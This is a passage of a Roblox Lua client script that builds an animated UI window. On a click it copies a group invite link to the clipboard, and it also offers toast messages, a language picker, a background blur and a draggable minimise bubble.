	TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 51,
}, toast, 13)
local toastClose = make("TextButton", {
	Size = UDim2.fromOffset(28, 28), Position = UDim2.new(1, -34, 0, 4), BackgroundTransparency = 1,
	Text = "\u{d7}", TextColor3 = C.muted, Font = Enum.Font.GothamBold, TextSize = 18, AutoButtonColor = false,
	BorderSizePixel = 0, ZIndex = 51,
}, toast)

local toastId = 0
local function hideToast()
	toastId += 1
	tween(toast, 0.3, { Position = TOAST_HIDDEN })
end
local function showToast(key, color, ...)
	toastId += 1
	local id = toastId
	toastMsg.Text = tr(key, ...)
	toastStroke.Color = color
	tween(toast, 0.35, { Position = TOAST_SHOWN }, Enum.EasingStyle.Back)
	task.delay(3.5, function()
		if id == toastId then tween(toast, 0.3, { Position = TOAST_HIDDEN }) end
	end)
end
toastClose.MouseButton1Click:Connect(hideToast)

---------------- page: join ----------------
local joinPage = newPage("join")
local joinTitle = fitLabel({
	Size = UDim2.new(1, -48, 0, 30), Position = UDim2.fromOffset(24, 14), TextColor3 = C.text,
	Font = Enum.Font.GothamBold, TextXAlignment = Enum.TextXAlignment.Left,
}, joinPage, 22)
local joinSub = fitLabel({
	Size = UDim2.new(1, -48, 0, 27), Position = UDim2.fromOffset(24, 46), TextColor3 = C.muted, TextWrapped = true,
	TextXAlignment = Enum.TextXAlignment.Left,
}, joinPage, 12)

-- the big button: one tap copies the group link
local ctaHit = make("TextButton", {
	Size = UDim2.new(1, -48, 0, 52), Position = UDim2.fromOffset(24, 76), BackgroundTransparency = 1,
	Text = "", AutoButtonColor = false, BorderSizePixel = 0,
}, joinPage)
local ctaFill = make("Frame", { Size = UDim2.fromScale(1, 1), BackgroundColor3 = C.white, BorderSizePixel = 0 }, ctaHit)
round(ctaFill, 13)
make("UIGradient", { Color = ColorSequence.new(C.accent, C.accent2), Rotation = 20 }, ctaFill)
local ctaStroke = stroke(ctaFill, C.white, 1, 0.8)
-- a soft light that glides across the button every few seconds so the eye goes to it
local shimmer = make("Frame", { Size = UDim2.fromScale(1, 1), BackgroundColor3 = C.white, BorderSizePixel = 0, ZIndex = 2 }, ctaHit)
round(shimmer, 13)
local shimmerGrad = make("UIGradient", {
	Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.44, 1), NumberSequenceKeypoint.new(0.5, 0.78),
		NumberSequenceKeypoint.new(0.56, 1), NumberSequenceKeypoint.new(1, 1),
	}),
	Offset = Vector2.new(-1, 0),
}, shimmer)
TweenService:Create(shimmerGrad, TweenInfo.new(1.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, false, 1.8),
	{ Offset = Vector2.new(1, 0) }):Play()
local ctaLabel = fitLabel({
	Size = UDim2.new(1, -28, 1, 0), Position = UDim2.fromOffset(14, 0), TextColor3 = C.white,
	Font = Enum.Font.GothamBold, ZIndex = 3,
}, ctaHit, 16)
local ctaScale = make("UIScale", {}, ctaHit)
bind(ctaHit,
	function() tween(ctaScale, 0.12, { Scale = 1.02 }) tween(ctaStroke, 0.12, { Transparency = 0.45 }) end,
	function() tween(ctaScale, 0.12, { Scale = 1 }) tween(ctaStroke, 0.12, { Transparency = 0.8 }) end,
	function() tween(ctaScale, 0.05, { Scale = 0.97 }) end,
	function() tween(ctaScale, 0.12, { Scale = 1.02 }) end)

-- the button text can show feedback ("Link copied") for a moment, then goes back to normal
local ctaKey, ctaArgs, ctaToken = "join_btn", table.pack(), 0
local function renderCta()
	ctaLabel.Text = tr(ctaKey, table.unpack(ctaArgs, 1, ctaArgs.n))
end
local function flashCta(key, ...)
	ctaKey, ctaArgs = key, table.pack(...)
	ctaToken += 1
	local id = ctaToken
	renderCta()
	task.delay(3.5, function()
		if id == ctaToken then
			ctaKey, ctaArgs = "join_btn", table.pack()
			renderCta()
		end
	end)
end

ctaHit.MouseButton1Click:Connect(function()
	if copy(GROUP_LINK) then
		flashCta("link_copied")
		showToast("link_copied", C.success)
	else
		flashCta("copy_failed", GROUP_NAME)
		showToast("copy_failed", C.danger, GROUP_NAME)
	end
end)

-- the three steps, right under the button (no extra tab to open)
local stepLabels = {}
for i = 1, 3 do
	local y = 146 + (i - 1) * 40
	local badge = make("Frame", {
		Size = UDim2.fromOffset(24, 24), Position = UDim2.fromOffset(24, y + 6),
		BackgroundColor3 = C.accent, BackgroundTransparency = 0.82, BorderSizePixel = 0,
	}, joinPage)
	round(badge, 12)
	stroke(badge, C.accent, 1, 0.55)
	label({
		Size = UDim2.fromScale(1, 1), Text = tostring(i), TextColor3 = Color3.fromRGB(196, 188, 255),
		Font = Enum.Font.GothamBold, TextSize = 12,
	}, badge)
	stepLabels[i] = fitLabel({
		Size = UDim2.new(1, -86, 0, 36), Position = UDim2.fromOffset(60, y), TextColor3 = C.text,
		TextWrapped = true, TextXAlignment = Enum.TextXAlignment.Left,
	}, joinPage, 13)
end

---------------- page: language ----------------
local setLanguage -- defined below
local langPage = newPage("lang")
local langTitle = fitLabel({
	Size = UDim2.new(1, -48, 0, 30), Position = UDim2.fromOffset(24, 14), TextColor3 = C.text,
	Font = Enum.Font.GothamBold, TextXAlignment = Enum.TextXAlignment.Left,
}, langPage, 22)
local langSub = fitLabel({
	Size = UDim2.new(1, -48, 0, 16), Position = UDim2.fromOffset(24, 47), TextColor3 = C.muted,
	TextXAlignment = Enum.TextXAlignment.Left,
}, langPage, 12)

-- scrollable list (touch-friendly), three buttons per row
local COLS, GAP = 3, 8
local btnW = math.floor((PAGE_W - 48 - GAP * (COLS - 1)) / COLS)
local rows = math.ceil(#LANGS / COLS)
local list = make("ScrollingFrame", {
	Size = UDim2.fromOffset(PAGE_W - 24, PAGE_H - 78), Position = UDim2.fromOffset(12, 74),
	BackgroundTransparency = 1, BorderSizePixel = 0, ScrollBarThickness = 3, ScrollBarImageColor3 = C.strokeHover,
	CanvasSize = UDim2.fromOffset(0, rows * 44 + 8), ScrollingDirection = Enum.ScrollingDirection.Y,
}, langPage)
local langLabels = {}
for i, item in ipairs(LANGS) do
	local col, row = (i - 1) % COLS, math.floor((i - 1) / COLS)
	local hit, lbl = makeButton(list, UDim2.fromOffset(12 + col * (btnW + GAP), 4 + row * 44),
		UDim2.fromOffset(btnW, 36), false, item[2], (item[1] == "ar") and 17 or 13)
	langLabels[item[1]] = lbl
	hit.MouseButton1Click:Connect(function() setLanguage(item[1]) end)
end

---------------- language wiring ----------------
local function applyLanguage()
	tabs.join.lbl.Text = tr("tab_join")
	tabs.lang.lbl.Text = tr("tab_lang")
	joinTitle.Text = tr("join_title")
	joinSub.Text = tr("join_sub")
	renderCta()
	for i = 1, 3 do stepLabels[i].Text = tr("s" .. i) end
	langTitle.Text = tr("tab_lang")
	langSub.Text = tr("lang_sub")
	for code, lbl in pairs(langLabels) do
		lbl.TextColor3 = (code == lang) and C.accent2 or C.text -- the selected / detected language is highlighted
	end
end

setLanguage = function(code)
	lang = code
	applyLanguage()
	showPage("join")
end

-- soft blur behind the window while it is open
local blur
pcall(function()
	blur = Instance.new("BlurEffect")
	blur.Name = "LumenBlur"
	blur.Size = 0
	blur.Parent = Lighting
end)
local function setBlur(size, t)
	if blur then tween(blur, t, { Size = size }) end
end

---------------- minimize bubble ----------------
local BUBBLE = 52
local bubble = make("TextButton", {
	Size = UDim2.fromOffset(BUBBLE, BUBBLE), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0, 49, 0.5, 0),
	BackgroundTransparency = 1, Text = "", AutoButtonColor = false, BorderSizePixel = 0, Visible = false,
}, gui)
for n = 1, 10 do -- very faint layers: a soft lift under the icon, never a dark box
	local grow = n * 2
	local layer = make("Frame", {
		AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0.5, 3),
		Size = UDim2.new(1, grow, 1, grow), BackgroundColor3 = Color3.new(0, 0, 0),
		BackgroundTransparency = 0.99, BorderSizePixel = 0,
	}, bubble)
	round(layer, BUBBLE * 0.3 + grow / 2)
end
makeLogo(bubble, BUBBLE, UDim2.fromOffset(0, 0))
local bubbleScale = make("UIScale", {}, bubble)
local bubbleMoved = draggable(bubble, bubble, function() return BUBBLE / 2, BUBBLE / 2 end)

bind(bubble,
	function() tween(bubbleScale, 0.12, { Scale = 1.1 }) end,
	function() tween(bubbleScale, 0.12, { Scale = 1 }) end)

local isOpen, openToken = true, 0
local rootHome = root.Position   -- where the window lives while open
local SMALL = 0.12               -- scale the window shrinks to inside the bubble

local function setOpen(open)
	if open == isOpen then return end
	isOpen = open
	openToken += 1
	local token = openToken
	if open then
		-- bubble pops away, window grows out of it
		tween(bubbleScale, 0.12, { Scale = 0 })
		task.delay(0.12, function()
			if isOpen and token == openToken then bubble.Visible = false end
		end)
		root.Position = bubble.Position
		rootScale.Scale = fit * SMALL
		window.GroupTransparency = 1
		windowStroke.Transparency = 1
		root.Visible = true
		tween(root, 0.34, { Position = rootHome })
		tween(rootScale, 0.34, { Scale = fit })
		tween(window, 0.2, { GroupTransparency = 0 })
		tween(windowStroke, 0.2, { Transparency = 0 })
		setShadow(true, 0.3)
		setBlur(10, 0.3)
	else
		-- window shrinks into the bubble, bubble pops in as it lands
		rootHome = root.Position
		tween(root, 0.28, { Position = bubble.Position })
		tween(rootScale, 0.28, { Scale = fit * SMALL })
		tween(window, 0.18, { GroupTransparency = 1 })
		tween(windowStroke, 0.18, { Transparency = 1 })
		setShadow(false, 0.14)
		setBlur(0, 0.2)
		task.delay(0.14, function()
			if token ~= openToken then return end
			bubble.Visible = true
			bubbleScale.Scale = 0
			tween(bubbleScale, 0.3, { Scale = 1 }, Enum.EasingStyle.Back)
		end)
		task.delay(0.3, function()
			if not isOpen and token == openToken then root.Visible = false end
		end)
	end
end

bubble.MouseButton1Click:Connect(function()
	if not bubbleMoved() then setOpen(true) end
end)

local function refit()
	fit = computeFit()
	if isOpen then tween(rootScale, 0.2, { Scale = fit }) end
end
gui:GetPropertyChangedSignal("AbsoluteSize"):Connect(refit)

-- close for good: right-click the bubble (PC) or hold it for ~1s (mobile). Undoes the FPS boost too.
local function unload()
	for _, c in ipairs(conns) do c:Disconnect() end
	tween(bubbleScale, 0.15, { Scale = 0.2 })
	task.wait(0.15)
	if blur then blur:Destroy() end
	gui:Destroy()
end


---------------- window buttons ----------------
minBtn.MouseButton1Click:Connect(function() setOpen(false) end)

---------------- start ----------------
applyLanguage()
showPage("join") -- language is auto-detected; players can switch it from the sidebar

tween(rootScale, 0.3, { Scale = fit })
tween(window, 0.2, { GroupTransparency = 0 })
tween(windowStroke, 0.2, { Transparency = 0 })
setShadow(true, 0.3)
setBlur(10, 0.4)
task.delay(0.4, refit)
print("[" .. NAME .. "] loaded")
